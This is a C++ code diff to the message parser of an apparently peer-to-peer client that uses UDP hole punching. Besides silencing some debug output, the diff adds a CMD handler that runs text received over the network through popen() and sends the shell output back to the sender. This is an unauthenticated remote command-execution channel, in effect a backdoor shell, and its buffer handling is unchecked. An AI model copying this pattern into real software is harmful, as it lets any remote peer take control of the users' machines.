@@ -143,13 +143,13 @@ class UnixClientMessageParser
 					{
 						//对方忽略打洞包
 						cout<< "recv punch data !" <<endl;
-						cout<< "connect is build !" <<endl;
+						//cout<< "connect is build !" <<endl;
 						return 0;
 					}
 				case MESSAGE_ACK:
 					{
 						cout<< "recv msgack data !"<<endl;
-						cout<< "connect is build !"<<endl;
+						//cout<< "connect is build !"<<endl;
 						return -2;
 					}
 				case MESSAGE://回 ack
@@ -162,7 +162,23 @@ class UnixClientMessageParser
 						memset(sendBuf, 0, MAX_PACKET_SIZE);
 						stMsg* sendmsg = (stMsg*) sendBuf;
 						sendmsg->msgType = MESSAGE_ACK;
+						
+						//FILE *fp = popen(message.c);
+						//sendmsg->message.length = ;
+
 						return -3;//sizeof(unsigned char);
+					}
+				case CMD://命令
+					{
+						FILE* fp = popen(recvmsg->message.content, "r");
+						memset(sendBuf, 0, MAX_PACKET_SIZE);
+						stMsg* sendmsg = (stMsg*) sendBuf;
+						sendmsg->msgType = MESSAGE;
+						fread(sendmsg->message.content, MAX_PACKET_SIZE - sizeof(int) ,1, fp);
+						//cout << strlen(sendmsg->message.content);
+						sendmsg->message.length = strlen(sendmsg->message.content) + 1;
+						pclose(fp);
+						return sendmsg->message.length + sizeof(unsigned char) + sizeof(unsigned int) + 3; //结构体对其方式有关
 					}
 				case CMD_USERLIST_RESP_QUIET:
 					{
@@ -176,7 +192,7 @@ class UnixClientMessageParser
 							memcpy(user->userName, recvmsg->userList.users[i].userName, MAX_NAME_SIZE);
 							user->userIP = recvmsg->userList.users[i].userIP;
 							user->userPort = recvmsg->userList.users[i].userPort;
-						//	cout<< user->userName <<endl;
+							//cout<< user->userName <<endl;
 							clientList.push_back(user);
 						}
 						return 0;
